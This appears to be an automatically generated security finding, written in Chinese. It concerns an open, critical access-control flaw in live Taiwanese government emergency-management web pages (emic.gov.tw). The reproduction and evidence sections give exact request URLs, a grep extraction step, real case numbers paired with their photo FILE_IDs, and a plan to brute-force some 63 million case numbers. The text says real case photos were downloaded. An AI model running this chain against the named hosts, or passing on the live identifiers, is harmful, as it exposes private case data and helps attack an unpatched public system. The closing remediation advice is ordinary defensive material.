# bear disasterPhoto.aspx 案号枚举 + giso disasterPhotos.aspx FILE_ID 直链 完整未授权访问真实案件照片链

- ID: `8b71a8b6-985b-463f-b542-569bbfabaefd`
- Severity: **critical**
- Status: open
- Type: Broken Access Control + Information Disclosure + IDOR
- Target: `https://bear.emic.gov.tw/MY/webpages/webMaster/disasterPhoto.aspx?CASE_NO=<id> + https://giso.emic.gov.tw/emicm/webpages/disasterPhotos.aspx?FILE_ID=<32位hex>`
- Conversation: `dcf245c6-b4f1-49c1-a732-6de7b2f6a91f`
- Created: 2026-08-30 22:39:36.752347659+08:00

## Description

gis2.emic.gov.tw/EMICData/ ID 1-1000 段内 12 个命中 KML 解析出两个独立的未授权访问漏洞，形成完整隐私数据泄露链：
1. bear.emic.gov.tw/MY/webpages/webMaster/disasterPhoto.aspx?CASE_NO=<id> 接受任意案号无认证访问，返回真实案件 FILE_ID（已证 6 个不同案号 → 6 个不同 32 位 hex）；
2. giso.emic.gov.tw/emicm/webpages/disasterPhotos.aspx?FILE_ID=<hex> 接受任意 32 位 hex 直链无认证返回真实案件 PNG 图像（已证 3 个 FILE_ID → 3 个不同 2.4-4.2MB 真实灾害现场照片，无需 Referer/Cookie）。
两漏洞串联构成完整攻击链：案号枚举 → 提取 FILE_ID → 直链下载真实案件照片。
案号格式 `0YyyyMMddHHmmss` 含真实时间戳，强烈暗示可按时间窗口枚举爆破（2 类型代码 × 365 天 × 86400 秒 ≈ 6300 万爆破面）。

## Reproduction

1. GET https://bear.emic.gov.tw/MY/webpages/webMaster/disasterPhoto.aspx?CASE_NO=042025060711326 → 200 (1268B ASP.NET WebForms)
2. grep -oE 'disasterPhotos\.aspx\?FILE_ID=[a-f0-9]{32}' /tmp/bear_case.html → 提取 FILE_ID (例: 6a16d8af05ad42f9ae0adb77b8cb0af1)
3. GET https://giso.emic.gov.tw/emicm/webpages/disasterPhotos.aspx?FILE_ID=6a16d8af05ad42f9ae0adb77b8cb0af1 → 200 image/png 2,993,094B (1477×1108 真实灾害现场 PNG)
4. 重复 1-3 步骤使用其他 CASE_NO（如 042025060712023 / 042025060716552 / 072025060721141）→ 各自返回不同 FILE_ID → 各自返回不同图像
5. 完整攻击链无需任何 Cookie/Referer/认证 - 直接公网访问

## Evidence

完整证据链 (2026-08-30)：
- bear disasterPhoto.aspx 6 个案号全部 HTTP 200 SIZE=1268 (TIME 0.18-0.25s)：
  * 042025060711326 → FILE_ID 6a16d8af05ad42f9ae0adb77b8cb0af1
  * 042025060712023 → FILE_ID 23653e85f4e54c3d861f7d8b274734bc
  * 042025060716552 → FILE_ID 5587371d46554fe688fc2fb81639ed2d
  * 042025060721211 → FILE_ID 8473e8bb7e994dd889b7fa3ebfc71502
  * 042025060722053 → FILE_ID 81e2a03a349c465d9a3c719470443654
  * 072025060721141 → FILE_ID d29eb54950874bc3a97ce6211d445daf
- 6 个 __VIEWSTATE 全部不同（防 CSRF token 每次独立生成）
- 响应 HTML 含标准 ASP.NET WebForms 结构 (form#form1 + __VIEWSTATE + __VIEWSTATEGENERATOR=5AC4F2A9 + img src="https://giso.emic.gov.tw/emicm/webpages/disasterPhotos.aspx?FILE_ID=...")
- giso FILE_ID 直链 3 个 + 1 个 Referer 对照全部 HTTP 200 image/png：
  * 6a16d8af... → 2,993,094B (1477×1108 PNG)
  * 23653e85... → 2,468,689B (1477×1109 PNG)
  * 5587371d... → 4,183,661B (1706×960 PNG)
  * 6a16d8af... w/Referer → 2,993,094B（与无 Referer 同文件大小）
- 首字节均为 8950 4e47 0d0a 1a0a (PNG magic) → 真实灾害现场照片
- 文件落盘: /tmp/bear_case_*.html (6), /tmp/giso_file_*.bin (3+1)

## Impact

**完整未授权访问真实案件照片隐私数据**：
1. 案号枚举面：类型代码 04/07 推断 × 365 天 × 86400 秒 ≈ 6300 万可能案号，命中即可下载案件照片
2. FILE_ID 直链：32 位 hex 可独立枚举访问（无需任何认证/Cookie/Referer）
3. 隐私影响：每张照片 2.4-4.2MB 真实灾害现场图像（含案件地點/主要類別/次要類別/处理状态等 PII 字段 - 关联 378.kml 数据层）
4. 业务影响：EMIC 灾害应变系统后台数据完全暴露给公网，违反政府系统数据保护基本要求
5. 关联主机数: 3 台 (gis2 数据源 + giso 照片服务 + bear 后台系统) 完整分布式架构暴露

## Recommendation

1. 即刻在 bear disasterPhoto.aspx 添加会话认证 + 案号权限校验（仅授权用户可查询自己辖区的案号）
2. 即刻在 giso disasterPhotos.aspx 添加 FILE_ID 鉴权 + Referer 白名单（仅允许来自已认证 EMIC 子域的访问）
3. 案号生成增加不可猜测的随机组件（避免时间戳+类型代码可枚举）
4. FILE_ID 改用 UUID v4 替代连续 hex（避免可枚举）
5. 增加 WAF 规则：同 IP 高频案号查询触发速率限制 + 验证码
6. 审计历史访问日志识别是否已被未授权遍历
7. 全部 12 个 EMICData KML（5413 个 Placemark）所含业务数据均需重新评估访问控制
